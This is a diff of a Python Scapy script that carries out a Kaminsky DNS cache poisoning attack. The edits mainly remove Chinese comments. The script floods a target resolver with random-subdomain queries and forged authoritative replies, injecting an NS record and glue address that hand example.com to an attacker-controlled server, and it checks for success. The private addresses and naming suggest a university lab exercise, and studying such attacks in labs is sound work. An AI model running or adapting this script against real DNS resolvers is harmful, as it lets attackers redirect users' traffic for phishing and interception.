@@ -4,55 +4,43 @@ import random
 import string
 import time
 
-# 配置
 target_dns = "10.10.27.2"
 attacker_ip = "10.10.27.4"
-fake_auth_ip = "199.43.135.53"  # 伪造的权威服务器IP
+fake_auth_ip = "199.43.135.53"  
 
 def generate_random_subdomain():
-    """生成随机子域名"""
     return ''.join(random.choices(string.ascii_lowercase, k=12))
 
 def send_kaminsky_attack():
-    """执行一次Kaminsky攻击"""
-    # 生成随机子域名
     subdomain = generate_random_subdomain()
     query_name = f"{subdomain}.example.com"
     
-    # 随机DNS ID和源端口
     dns_id = random.randint(1, 65535)
     src_port = random.randint(30000, 60000)
     
     print(f"[*] Sending attack for: {query_name} (ID: {dns_id}, Port: {src_port})")
     
-    # 1. 发送查询包到目标DNS服务器
     query_pkt = IP(dst=target_dns, src=attacker_ip) / \
                 UDP(sport=src_port, dport=53) / \
                 DNS(id=dns_id, rd=1, qd=DNSQR(qname=query_name, qtype="A"))
     
     send(query_pkt, verbose=0)
     
-    # 2. 立即发送伪造的应答包
-    # 伪造来自权威DNS服务器的应答
     forged_pkt = IP(src=fake_auth_ip, dst=target_dns) / \
                  UDP(sport=53, dport=src_port) / \
                  DNS(id=dns_id, 
-                     qr=1,      # 应答
-                     aa=1,      # 权威应答
+                     qr=1,    
+                     aa=1,     
                      rd=0,
                      qd=DNSQR(qname=query_name, qtype="A"),
-                     # 回答部分：子域名的A记录
                      an=DNSRR(rrname=query_name, ttl=600, rdata="20.23.3.19"),
-                     # 权威部分：example.com的NS记录
                      ns=DNSRR(rrname="example.com", ttl=600, type="NS", rdata="ns.hust-cse.net"),
-                     # 附加部分：glue记录
                      ar=DNSRR(rrname="ns.hust-cse.net", ttl=600, rdata="10.10.27.4"))
     
     send(forged_pkt, verbose=0)
     print(f"[+] Sent forged response")
 
 def mass_attack():
-    """大规模攻击"""
     print("[*] Starting Kaminsky attack...")
     print("[*] Target DNS: 10.10.27.2")
     print("[*] Fake NS: ns.hust-cse.net -> 10.10.27.4")
@@ -61,41 +49,36 @@ def mass_attack():
     success_count = 0
     
     try:
-        while success_count < 1:  # 成功一次就停止
-            # 每次攻击发送多个包增加成功率
+        while success_count < 1: 
             for i in range(10):
                 send_kaminsky_attack()
-                time.sleep(0.01)  # 10ms间隔
+                time.sleep(0.01)
             
             attack_count += 1
             print(f"[*] Attack batch {attack_count} completed")
             
-            # 每5批检查一次是否成功
             if attack_count % 5 == 0:
                 if check_attack_success():
                     success_count += 1
                     print("[SUCCESS] Attack succeeded! DNS cache poisoned.")
                     break
             
-            time.sleep(0.5)  # 批次间延迟
+            time.sleep(0.5)  
             
     except KeyboardInterrupt:
         print("\n[*] Attack stopped by user")
 
 def check_attack_success():
-    """检查攻击是否成功"""
     try:
-        # 查询example.com的NS记录
         pkt = IP(dst=target_dns, src=attacker_ip) / \
               UDP(sport=random.randint(30000, 60000), dport=53) / \
               DNS(rd=1, qd=DNSQR(qname="example.com", qtype="NS"))
         
-        # 发送并接收响应（设置超时）
         response = sr1(pkt, timeout=2, verbose=0)
         
         if response and response.haslayer(DNS):
             for i in range(response[DNS].ancount):
-                if response[DNS].an[i].type == 2:  # NS记录
+                if response[DNS].an[i].type == 2: 
                     ns_name = response[DNS].an[i].rdata.decode()
                     if 'ns.hust-cse.net' in ns_name:
                         return True
@@ -104,4 +87,5 @@ def check_attack_success():
         return False
 
 if __name__ == "__main__":
+
     mass_attack()
